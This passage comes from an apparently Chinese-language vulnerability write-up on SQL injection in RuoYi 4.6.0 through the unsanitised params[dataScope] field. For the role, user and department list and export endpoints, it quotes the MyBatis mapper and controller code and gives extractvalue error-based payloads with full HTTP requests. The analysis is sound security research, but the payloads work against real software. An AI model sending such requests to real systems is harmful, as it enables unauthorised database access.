r.role_key like concat(&#x27;%&#x27;, #&#123;roleKey&#125;, &#x27;%&#x27;)<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;dataScope != null and dataScope != &#x27;&#x27;&quot;</span>&gt;</span><br>    AND r.data_scope = #&#123;dataScope&#125;<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.beginTime != null and params.beginTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 开始时间检索 --&gt;</span><br>    and date_format(r.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;gt;</span>= date_format(#&#123;params.beginTime&#125;,&#x27;%y%m%d&#x27;)<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.endTime != null and params.endTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 结束时间检索 --&gt;</span><br>    and date_format(r.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;lt;</span>= date_format(#&#123;params.endTime&#125;,&#x27;%y%m%d&#x27;)<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>  $&#123;params.dataScope&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>该配置的 SQL 语句可以还原为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> r.role_id,<br>       r.role_name,<br>       r.role_key,<br>       r.status,<br>       r.data_scope,<br>       r.create_time<br><span class="hljs-keyword">FROM</span> sys_role r<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> sys_user_role ur <span class="hljs-keyword">ON</span> r.role_id <span class="hljs-operator">=</span> ur.role_id<br><span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> sys_user u <span class="hljs-keyword">ON</span> ur.user_id <span class="hljs-operator">=</span> u.user_id<br><span class="hljs-keyword">WHERE</span> r.del_flag <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;0&#x27;</span><br>  <span class="hljs-keyword">AND</span> r.role_name <span class="hljs-keyword">LIKE</span> CONCAT(<span class="hljs-string">&#x27;%&#x27;</span>, ?, <span class="hljs-string">&#x27;%&#x27;</span>)<br>  <span class="hljs-keyword">AND</span> r.status <span class="hljs-operator">=</span> ?<br>  <span class="hljs-keyword">AND</span> r.role_key <span class="hljs-keyword">LIKE</span> CONCAT(<span class="hljs-string">&#x27;%&#x27;</span>, ?, <span class="hljs-string">&#x27;%&#x27;</span>)<br>  <span class="hljs-keyword">AND</span> r.data_scope <span class="hljs-operator">=</span> ?<br>  <span class="hljs-keyword">AND</span> DATE_FORMAT(r.create_time,<span class="hljs-string">&#x27;%y%m%d&#x27;</span>) <span class="hljs-operator">&gt;=</span> DATE_FORMAT(?, <span class="hljs-string">&#x27;%y%m%d&#x27;</span>)<br>  <span class="hljs-keyword">AND</span> DATE_FORMAT(r.create_time,<span class="hljs-string">&#x27;%y%m%d&#x27;</span>) <span class="hljs-operator">&lt;=</span> DATE_FORMAT(?, <span class="hljs-string">&#x27;%y%m%d&#x27;</span>)<br>  $&#123;params.dataScope&#125;<br></code></pre></td></tr></table></figure>

<p>因此非常容易能够看出，只要<code>params.dataScope</code>可控，就能够构造一个非常有效的 SQL 注入；</p>
<p>定位该使用该 XML 配置进行处理的接口，通过<code>MyBatisX</code>插件定位函数，然后再一路查找函数用法，可以找到下方的接口处理函数，位于<code>RuoYi-4.6.0\ruoyi-admin\src\main\java\com\ruoyi\web\controller\system\SysRoleController.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresPermissions(&quot;system:role:list&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/list&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> TableDataInfo <span class="hljs-title function_">list</span><span class="hljs-params">(SysRole role)</span><br>&#123;<br>    startPage();<br>    List&lt;SysRole&gt; list = roleService.selectRoleList(role);<br>    <span class="hljs-keyword">return</span> getDataTable(list);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>传入参数为<code>SysRole</code>类型且没有对其进行任何过滤，<code>SysRole</code>继承<code>BaseEntity</code>类，在<code>BaseEntity</code>类中存在对<code>params</code>参数的定义，位于<code>RuoYi-4.6.0/ruoyi-common/src/main/java/com/ruoyi/common/core/domain/BaseEntity.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseEntity</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span><br>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    <span class="hljs-comment">/** 搜索值 */</span><br>    <span class="hljs-keyword">private</span> String searchValue;<br><br>    <span class="hljs-comment">/** 创建者 */</span><br>    <span class="hljs-keyword">private</span> String createBy;<br><br>    <span class="hljs-comment">/** 创建时间 */</span><br>    <span class="hljs-meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span><br>    <span class="hljs-keyword">private</span> Date createTime;<br><br>    <span class="hljs-comment">/** 更新者 */</span><br>    <span class="hljs-keyword">private</span> String updateBy;<br><br>    <span class="hljs-comment">/** 更新时间 */</span><br>    <span class="hljs-meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span><br>    <span class="hljs-keyword">private</span> Date updateTime;<br><br>    <span class="hljs-comment">/** 备注 */</span><br>    <span class="hljs-keyword">private</span> String remark;<br><br>    <span class="hljs-comment">/** 请求参数 */</span><br>    <span class="hljs-keyword">private</span> Map&lt;String, Object&gt; params;<br>    <br>    ...<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>因此，可以直接通过传入<code>params[dataScope]=</code>参数对其中内容进行定义，该内容也会直接拼接在 sql 语句后，从而导致 sql 注入的产生。</p>
<h2 id="2-2-注入点-role-export接口（"><a href="#2-2-注入点-role-export接口（" class="headerlink" title="2.2 注入点/role/export接口（&lt;V4.6.2）"></a>2.2 注入点<code>/role/export</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754633892665-c46c20fe-8d9f-4b2d-ba1c-39fe09c99590.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754633906695-fa7d2726-c4e6-4a0a-9a76-90282920080d.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/role/export</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>179<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/role<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=b185af4c-a86a-4b74-bf9f-8e422b68bc56<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-apache"><span class="hljs-attribute">roleName</span>=&amp;roleKey=&amp;status=&amp;params%<span class="hljs-number">5</span>BbeginTime%<span class="hljs-number">5</span>D=&amp;params%<span class="hljs-number">5</span>BendTime%<span class="hljs-number">5</span>D=&amp;orderByColumn=roleSort&amp;isAsc=asc&amp;params%<span class="hljs-number">5</span>BdataScope%<span class="hljs-number">5</span>D=and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span class="hljs-number">0</span>x7e))</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754633853906-d64c4b46-cdb5-4556-bae3-615d0b0b1a1c.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此处的漏洞分析内容其实与 2.1 小节的漏洞分析<a href="#P1ZYU">注入点&#x2F;role&#x2F;list接口</a>一致，因此这里不在赘述，简单进行分析。</p>
<p>根据 Mybatis 的配置可以看出在此处是存在 sql 注入的可能性；</p>
<p><code>RuoYi-4.6.0/ruoyi-system/src/main/resources/mapper/system/SysRoleMapper.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectRoleList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysRole&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysRoleResult&quot;</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">refid</span>=<span class="hljs-string">&quot;selectRoleContactVo&quot;</span>/&gt;</span><br>	where r.del_flag = &#x27;0&#x27;<br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;roleName != null and roleName != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND r.role_name like concat(&#x27;%&#x27;, #&#123;roleName&#125;, &#x27;%&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND r.status = #&#123;status&#125;<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;roleKey != null and roleKey != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND r.role_key like concat(&#x27;%&#x27;, #&#123;roleKey&#125;, &#x27;%&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;dataScope != null and dataScope != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND r.data_scope = #&#123;dataScope&#125;<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.beginTime != null and params.beginTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 开始时间检索 --&gt;</span><br>		and date_format(r.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;gt;</span>= date_format(#&#123;params.beginTime&#125;,&#x27;%y%m%d&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.endTime != null and params.endTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 结束时间检索 --&gt;</span><br>		and date_format(r.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;lt;</span>= date_format(#&#123;params.endTime&#125;,&#x27;%y%m%d&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>	$&#123;params.dataScope&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>找到使用相应 Mybatis 配置的位置可以看出与<code>/role/list</code>接口一致，传入的是<code>SysRole</code>参数，从而能够通过定义<code>params.dataScope</code>实现 sql 注入；</p>
<p><code>RuoYi-4.6.0/ruoyi-admin/src/main/java/com/ruoyi/web/controller/system/SysRoleController.java</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Log(title = &quot;角色管理&quot;, businessType = BusinessType.EXPORT)</span><br><span class="hljs-meta">@RequiresPermissions(&quot;system:role:export&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/export&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> AjaxResult <span class="hljs-title function_">export</span><span class="hljs-params">(SysRole role)</span><br>&#123;<br>    List&lt;SysRole&gt; list = roleService.selectRoleList(role);<br>    ExcelUtil&lt;SysRole&gt; util = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExcelUtil</span>&lt;SysRole&gt;(SysRole.class);<br>    <span class="hljs-keyword">return</span> util.exportExcel(list, <span class="hljs-string">&quot;角色数据&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="2-3-注入点-user-list接口（"><a href="#2-3-注入点-user-list接口（" class="headerlink" title="2.3 注入点/user/list接口（&lt;V4.6.2）"></a>2.3 注入点<code>/user/list</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634541017-1b2aaeaf-2e9f-4012-9efe-d2f08c4bc8ef.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634514079-d2f7361a-f255-4e52-bdc0-41072be7b8c5.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/user/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>227<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/user<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=b185af4c-a86a-4b74-bf9f-8e422b68bc56<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-sas">pageSize=10<span class="hljs-variable">&amp;pageNum</span>=1<span class="hljs-variable">&amp;orderByColumn</span>=createTime<span class="hljs-variable">&amp;isAsc</span>=desc<span class="hljs-variable">&amp;deptId</span>=<span class="hljs-variable">&amp;parentId</span>=<span class="hljs-variable">&amp;loginName</span>=<span class="hljs-variable">&amp;phonenumber</span>=<span class="hljs-variable">&amp;status</span>=<span class="hljs-variable">&amp;params</span>%5BbeginTime%5D=<span class="hljs-variable">&amp;params</span>%5BendTime%5D=<span class="hljs-variable">&amp;params</span>%5BdataScope%5D=<span class="hljs-keyword">and</span> extractvalue(1,concat(0x7e,(<span class="hljs-keyword">select</span> user()),0x7e))</span><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634473171-c67bc5d6-9f19-4d42-87ff-9ce4c3fbed5b.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>此处的漏洞分析内容其实与 2.1 小节的漏洞分析一致，因此这里不在赘述。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectUserList&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;SysUser&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;SysUserResult&quot;</span>&gt;</span><br>	select u.user_id, u.dept_id, u.login_name, u.user_name, u.user_type, u.email, u.avatar, u.phonenumber, u.password, u.sex, u.salt, u.status, u.del_flag, u.login_ip, u.login_date, u.create_by, u.create_time, u.remark, d.dept_name, d.leader from sys_user u<br>	left join sys_dept d on u.dept_id = d.dept_id<br>	where u.del_flag = &#x27;0&#x27;<br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;loginName != null and loginName != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND u.login_name like concat(&#x27;%&#x27;, #&#123;loginName&#125;, &#x27;%&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND u.status = #&#123;status&#125;<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;phonenumber != null and phonenumber != &#x27;&#x27;&quot;</span>&gt;</span><br>		AND u.phonenumber like concat(&#x27;%&#x27;, #&#123;phonenumber&#125;, &#x27;%&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.beginTime != null and params.beginTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 开始时间检索 --&gt;</span><br>		AND date_format(u.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;gt;</span>= date_format(#&#123;params.beginTime&#125;,&#x27;%y%m%d&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;params.endTime != null and params.endTime != &#x27;&#x27;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 结束时间检索 --&gt;</span><br>		AND date_format(u.create_time,&#x27;%y%m%d&#x27;) <span class="hljs-symbol">&amp;lt;</span>= date_format(#&#123;params.endTime&#125;,&#x27;%y%m%d&#x27;)<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;deptId != null and deptId != 0&quot;</span>&gt;</span><br>		AND (u.dept_id = #&#123;deptId&#125; OR u.dept_id IN ( SELECT t.dept_id FROM sys_dept t WHERE FIND_IN_SET (#&#123;deptId&#125;,ancestors) ))<br>	<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>	<span class="hljs-comment">&lt;!-- 数据范围过滤 --&gt;</span><br>	$&#123;params.dataScope&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequiresPermissions(&quot;system:user:list&quot;)</span><br><span class="hljs-meta">@PostMapping(&quot;/list&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> TableDataInfo <span class="hljs-title function_">list</span><span class="hljs-params">(SysUser user)</span><br>&#123;<br>    startPage();<br>    List&lt;SysUser&gt; list = userService.selectUserList(user);<br>    <span class="hljs-keyword">return</span> getDataTable(list);<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="2-4-注入点-dept-list接口（"><a href="#2-4-注入点-dept-list接口（" class="headerlink" title="2.4 注入点/dept/list接口（&lt;V4.6.2）"></a>2.4 注入点<code>/dept/list</code>接口（&lt;V4.6.2）</h2><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634717740-33e531a0-0f57-45e3-ac2c-76c8b5d8bd51.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/1754634698973-a4d30ae5-4953-4232-aa6c-b161e2d4797f.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">&amp;params%5BdataScope%5D=and extractvalue(1,concat(0x7e,(select user()),0x7e))<br></code></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/system/dept/list</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.10<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>93<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.1.10<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.1.10/system/dept<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=b185af4c-a86a-4b74-bf9f-8e422b68bc56<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-apache"><span class="hljs-attribute">deptName</span>=&amp;status=&amp;params%<span class="hljs-number">5</span>BdataScope%<span class="hljs-number">5</span>D=and extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(select user()),<span 